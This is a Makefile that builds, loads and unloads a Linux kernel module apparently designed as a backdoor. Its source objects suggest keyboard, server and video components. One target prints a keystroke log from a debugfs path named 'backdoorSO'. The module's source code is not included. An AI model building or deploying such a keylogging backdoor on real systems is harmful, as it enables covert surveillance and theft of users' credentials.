obj-m += main_module.o
main_module-y = kernel_server.o keyboardmodule.o kernelmodule.o KernelModuleVideo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

insert:
	sudo insmod main_module.ko

remove:
	sudo rmmod main_module.ko

show:
	sudo cat /sys/kernel/debug/backdoorSO/bdKeyboardLog

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
